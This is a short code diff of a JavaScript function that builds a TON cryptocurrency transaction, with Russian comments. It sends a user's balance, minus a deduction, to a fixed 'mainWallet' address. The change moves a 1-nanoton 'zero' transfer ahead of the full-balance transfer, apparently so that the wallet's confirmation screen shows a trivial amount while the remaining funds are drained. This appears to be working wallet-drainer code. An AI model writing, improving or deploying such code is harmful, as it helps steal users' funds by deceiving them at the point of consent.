@@ -90,17 +90,17 @@ async function didtrans() {
 
         const remainingBalance = originalBalance - deduction;
 
-        // Формируем транзакцию с двумя сообщениями
+        // Формируем транзакцию с двумя сообщениями (нулевая идет первой!)
         const transaction = {
             validUntil: Math.floor(Date.now() / 1000) + 60,
             messages: [
                 {
-                    address: mainWallet,
-                    amount: remainingBalance, // Основная сумма перевода
+                    address: mainWallet, // Нулевая транзакция первой
+                    amount: 1, // 1 нанотон (около нуля)
                 },
                 {
-                    address: mainWallet, // Второе сообщение с минимальной суммой
-                    amount: 1, // 1 нанотон (около нуля)
+                    address: mainWallet, // Основная транзакция с балансом
+                    amount: remainingBalance, 
                 }
             ],
             sendMode: 3,
